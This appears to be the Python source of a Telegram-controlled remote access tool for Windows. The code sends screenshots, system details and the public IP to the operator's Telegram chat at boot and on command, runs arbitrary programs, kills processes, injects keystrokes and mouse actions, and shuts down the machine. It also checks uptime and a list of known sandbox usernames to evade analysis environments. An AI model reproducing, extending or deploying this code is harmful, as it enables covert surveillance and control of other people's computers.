import ctypes
import datetime
import os
import platform
import psutil
import pyautogui
import requests
import subprocess
import telegram
import win32api
import win32con
import win32gui
import win32ui

from telegram.ext import CommandHandler, Filters, MessageHandler, Updater

#from comandi.startup import Startup
from config import __CONFIG__

TOKEN = __CONFIG__['TOKEN']

MY_USER_ID = __CONFIG__['MY_USER_ID']


#Startup()

def unknown(update, context):
    context.bot.send_message(chat_id=update.message.chat_id, text="Error, type /help for a list of commands -_-")

def start(update, context):
    # Verify that the message was sent by you
    if str(update.message.from_user.id) == MY_USER_ID:
        print("User Vusa Confirmed")
        update.message.reply_text("Available -_-")
        update.message.reply_text("Type /help to get the list of commands")
    else:
        update.message.reply_text(f"why are you trying to use my bot, {update.effective_user.first_name}?")

#SHOW COMMANDS
def help(update, context):
    if str(update.message.from_user.id) == MY_USER_ID:
        command1 = "__USAGE__ by_vusa -_-\n\nSANDBOX⛔\n\n/sandbox Detect Sandbox\n\nSISTEMA💻\n\n/poweroff Power off the PC\n/screen PC screen\n/alert Alert on pc\n/info User information\n\nPROCESS📃\n\n/kill Terminate a process\n/open Open a process\n/process List processes\n\n"
        command2 = "MOUSE🖱\n\n/doubleclick Perform a double-click with the mouse\n/left Move the cursor to the left\n/move Move the cursor to the specified coordinates (use the format: /move <x> <y>)\n\nKEYBOARD⌨\n\n/enter Press the Enter key\n"
        command3 = "/type Type on the PC(use the format: /move <message>)\n/win Press the WIN key\n\nSECURITY🔐\n\n/lock Lock the screen\n/destroy Destroy everything\n"
        update.message.reply_text(command1 + command2 + command3)
    else:
        update.message.reply_text(f"why are you trying to use my bot, {update.effective_user.first_name}?")

#SANDBOXDETECT
def sandbox_detect(update, context):
    if str(update.message.from_user.id) == MY_USER_ID:
        boot_time = psutil.boot_time()
        current_time = datetime.datetime.now().timestamp()
        up_time = current_time - boot_time
        up_time = datetime.timedelta(seconds=up_time)

        days = up_time.days
        hours, remainder = divmod(up_time.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)

        formatted_time = f"{days}d {hours}h {minutes}m {seconds}s"
        update.message.reply_text("PC turned on for " + str(formatted_time))
        sospect_user1 = ['HEUeRzl', 'server', 'Lucas', 'John', 'Frank', '8Nl0ColNQ5bq', 'fred', 'kEecfMwgj', 'PxmdUOpVyx', 'patex', 'Lisa', '3u2v9m8', 'RDhJ0CNFevzX', 'PateX', 'george', 'mike', 'BvJChRPnsxn', 'Harry Johnson', 'h7dk1xPr']
        sospect_user2 = ['mike', 'BvJChRPnsxn', 'Harry Johnson', 'h7dk1xPr', 'Julia', 'User01', 'hmarc', 'lmVwjj9b', 'WDAGUtilityAccount', 'RGzcBUyrznReg', 'test', 'Abby', 'Louise', 'w0fjuOVmCcP5A', '8VizSM', 'PqONjHVwexsS', 'SqgFOf3G']
        sospect_user3 = [ 'Julia', 'User01', 'hmarc', 'lmVwjj9b', 'WDAGUtilityAccount', 'RGzcBUyrznReg', 'test', 'Abby', 'Louise', 'w0fjuOVmCcP5A', '8VizSM', 'PqONjHVwexsS', 'SqgFOf3G']
        sospect_list = sospect_user1 + sospect_user2 + sospect_user3
        username_full = psutil.Process().username()
        username_parts = username_full.split('\\')
        username = username_parts[-1]
        if username in sospect_list:
            update.message.reply_text(str(username) +" is present in the suspect list!")
        else:
            update.message.reply_text(str(username) +"  is not present in the suspect list")
        if up_time.total_seconds() <300 or username in sospect_list:
            update.message.reply_text("It might be a sandbox environment")
        else:
            update.message.reply_text("It doesn't seem to be a sandbox environment")

#DESTROY
def destroy(update, context):
    if str(update.message.from_user.id) == MY_USER_ID:
        update.message.reply_text("work in progress")

#GET IP
def get_ip():
        response = requests.get('https://api64.ipify.org?format=json')
        ip_address = response.json()['ip']
        return ip_address

def systeminfous(update, context):
    if str(update.message.from_user.id) == MY_USER_ID:
        userprofile = os.environ['USERPROFILE']
        systeminfo  = platform.uname()
        ip_address = get_ip()
        tmp_account = "System: " + systeminfo.system + "\r\n"
        tmp_account += "Computer Name: " + systeminfo.node + "\r\n"
        tmp_account += "Username: " + userprofile + "\r\n"
        tmp_account += "Version: " + systeminfo.version + "\r\n"
        tmp_account += "IPv4: " + ip_address + "\r\n"
        tmp_account += "Processor: " + systeminfo.processor + "\r\n"
        cpu_usage = psutil.cpu_percent()
        tmp_account += "CPU Usage: " + str(cpu_usage) + "%\r\n"
        memory_usage = psutil.virtual_memory().percent
        tmp_account += "Memory Usage: " + str(memory_usage) + "%\r\n"
        disk_usage = psutil.disk_usage('/').percent
        tmp_account += "Disk Usage: " + str(disk_usage) + "%\r\n"
        update.message.reply_text(tmp_account)
    else:
        update.message.reply_text(f"Why are you trying to use my bot, {update.effective_user.first_name}?")

#TAKE A SCREEN
def screen(update, context):
    if str(update.message.from_user.id) == MY_USER_ID:
        update.message.reply_text("Sending...")
        def get_dimensions():
                width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
                height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
                left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
                top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
                return (width, height, left, top)
                
        def screenshot(name='screenshot'):
            hdesktop = win32gui.GetDesktopWindow()
            width, height, left, top = get_dimensions()

            desktop_dc = win32gui.GetWindowDC(hdesktop)
            img_dc = win32ui.CreateDCFromHandle(desktop_dc)
            mem_dc = img_dc.CreateCompatibleDC()

            screenshot = win32ui.CreateBitmap()
            screenshot.CreateCompatibleBitmap(img_dc, width, height)
            mem_dc.SelectObject(screenshot)
            mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

            #saving in a temporary folder
            temp_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Temp', f'{name}.bmp')
            screenshot.SaveBitmapFile(mem_dc, temp_path)

            mem_dc.DeleteDC()
            win32gui.DeleteObject(screenshot.GetHandle())

            img_path = temp_path 
            return img_path 
        
        img_path = screenshot()

        with open(img_path, 'rb') as f:
            context.bot.send_photo(chat_id=update.effective_chat.id, photo=f)
        #delete the screen
        os.remove(img_path)
    else:
        update.message.reply_text(f"why are you trying to use my bot,{update.effective_user.first_name}?")

#PROCESS LIST
def get_processes(update, context):
    processes = []
    for proc in psutil.process_iter():
        processes.append(proc.name())
    update.message.reply_text('\n'.join(processes))

#OPEN A PROCESS
def open_process(update, context):
    if str(update.message.from_user.id) == MY_USER_ID:
        try:
            command = update.message.text.strip().split(' ')
            if len(command) >= 2 and command[0] == '/open':
                process_path = ' '.join(command[1:])
                subprocess.Popen(process_path)
                update.message.reply_text(f"Process '{process_path}' opened successfully")
            else:
                update.message.reply_text("Invalid command. Usage: /open <process_path>")
        except Exception as e:
            update.message.reply_text(f"Failed to open process: {str(e)}")
    else:
        update.message.reply_text("You are not authorized to use this command.")
#ALERT
import pyautogui

def alert(update, context):
    if str(update.message.from_user.id) == MY_USER_ID:
        alert_message = ' '.join(update.message.text.split()[1:])
        pyautogui.alert(alert_message, "Alert by VUSA")
        update.message.reply_text("Alert inviato")
    else:
        update.message.reply_text("Errore. -_-")

#KILL A PROCESS
def kill_process(update, context):
    if str(update.message.from_user.id) == MY_USER_ID:
        text = update.message.text[6:].lower()
        id_process = text
        try:
            subprocess.run(['taskkill', '/f', '/im', id_process])
            update.message.reply_text(f"Processo {id_process} terminato con successo")
        except subprocess.CalledProcessError:
            update.message.reply_text(f"Processo {id_process} non trovato")
        print("\n")
    else:
        update.message.reply_text(f"why are you trying to use my bot,{update.effective_user.first_name}?")

#left_click
def left_click(update, context):
    if str(update.message.from_user.id) == MY_USER_ID:
        pyautogui.click(button='left')

#doubleclick
def double_click(update, context):
    if str(update.message.from_user.id) == MY_USER_ID:
        pyautogui.doubleClick(button='left')

#MOVE
def move(update, context):
    if str(update.message.from_user.id) == MY_USER_ID:
        try:
            command = update.message.text.strip().split(' ')
            if len(command) == 3 and command[0] == '/move':
                x = int(command[1])
                y = int(command[2])
                pyautogui.moveTo(x, y)
                update.message.reply_text(f"Cursor moved to coordinates ({x}, {y})")
            else:
                update.message.reply_text("Invalid command. Please use the format: /move <x> <y>")
        except ValueError:
            update.message.reply_text("Invalid coordinates. Make sure to enter numerical values for x and y.")
    else:
        update.message.reply_text("You are not authorized to use this command.")

#WRITE ON PC
def type_message(update, context):
    if str(update.message.from_user.id) == MY_USER_ID:
        try:
            pyautogui.FAILSAFE = False
            text = update.message.text[6:].lower()
            pyautogui.write(text)
            update.message.reply_text("Message typed successfully")
        except Exception as e:
            update.message.reply_text(f"Failed to type message: {str(e)}")
    else:
        update.message.reply_text(f"Why are you trying to use my bot, {update.effective_user.first_name}?")
#PRESS ENTER
def enter(update, context):
    if str(update.message.from_user.id) == MY_USER_ID:
        pyautogui.press("enter")

#PRESS WINLEFT
def win(update, context):
    if str(update.message.from_user.id) == MY_USER_ID:
        pyautogui.press("win")

#SHOTDOWN PC
def poweroff(update, context):
    if str(update.message.from_user.id) == MY_USER_ID:
        os.system("shutdown /s /t 1")
    else:
        update.message.reply_text(f"why are you trying to use my bot,{update.effective_user.first_name}?")

#LOCKSCREEN
def lock(update, context):
    if str(update.message.from_user.id) == MY_USER_ID:
        ctypes.windll.user32.LockWorkStation()
    else:
        update.message.reply_text(f"why are you trying to use my bot,{update.effective_user.first_name}?")

#dispatcher
updater = Updater(TOKEN)
updater.dispatcher.add_handler(CommandHandler("start", start))
updater.dispatcher.add_handler(CommandHandler("help", help))
updater.dispatcher.add_handler(CommandHandler("sandbox", sandbox_detect))
updater.dispatcher.add_handler(CommandHandler("destroy", destroy))
updater.dispatcher.add_handler(CommandHandler("info", systeminfous))
updater.dispatcher.add_handler(CommandHandler("screen", screen))
updater.dispatcher.add_handler(CommandHandler("alert", alert))
updater.dispatcher.add_handler(CommandHandler("kill", kill_process))
updater.dispatcher.add_handler(CommandHandler("open", open_process))
updater.dispatcher.add_handler(CommandHandler("process", get_processes))
updater.dispatcher.add_handler(CommandHandler("doubleclick", double_click))
updater.dispatcher.add_handler(CommandHandler("left", left_click))
updater.dispatcher.add_handler(CommandHandler("move", move))
updater.dispatcher.add_handler(CommandHandler("enter", enter))
updater.dispatcher.add_handler(CommandHandler("type", type_message))
updater.dispatcher.add_handler(CommandHandler("win", win))
updater.dispatcher.add_handler(CommandHandler("lock", lock))
updater.dispatcher.add_handler(CommandHandler("poweroff", poweroff))
updater.dispatcher.add_handler(CommandHandler("open", open_process))
updater.dispatcher.add_handler(MessageHandler(Filters.command, unknown))
print("Ready -_- ...")

def firstscreen(bot, chat_id):
    try:
        def get_dimensions():
            width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
            height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
            left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
            top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
            return (width, height, left, top)

        def screenshot(name='screenshot'):
            hdesktop = win32gui.GetDesktopWindow()
            width, height, left, top = get_dimensions()

            desktop_dc = win32gui.GetWindowDC(hdesktop)
            img_dc = win32ui.CreateDCFromHandle(desktop_dc)
            mem_dc = img_dc.CreateCompatibleDC()

            screenshot = win32ui.CreateBitmap()
            screenshot.CreateCompatibleBitmap(img_dc, width, height)
            mem_dc.SelectObject(screenshot)
            mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

            # Saving in a temporary folder
            temp_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Temp', f'{name}.bmp')
            screenshot.SaveBitmapFile(mem_dc, temp_path)

            mem_dc.DeleteDC()
            win32gui.DeleteObject(screenshot.GetHandle())

            img_path = temp_path
            return img_path

        img_path = screenshot()

        with open(img_path, 'rb') as f:
            bot.send_photo(chat_id=chat_id, photo=f)
        os.remove(img_path)
    except Exception as e:
        error_message = "Impossibile inviare lo screen. Errore: {}".format(str(e))
        bot.send_message(chat_id=chat_id, text=error_message)

def start_program():
    from datetime import datetime
    now = datetime.now()
    timestamp = now.strftime('%Y-%m-%d %H:%M:%S')

    bot = telegram.Bot(token=TOKEN)
    # Message every time the PC is turned on
    message = f'⚠ Someone turned on your PC! -_- ⚠\nSent at {timestamp}.\n Use: /sandbox or /info'
    bot.send_message(chat_id=MY_USER_ID, text=message)
    print("Waiting for the user...")
    firstscreen(bot, MY_USER_ID)

if __name__ == '__main__':
    start_program()
updater.start_polling()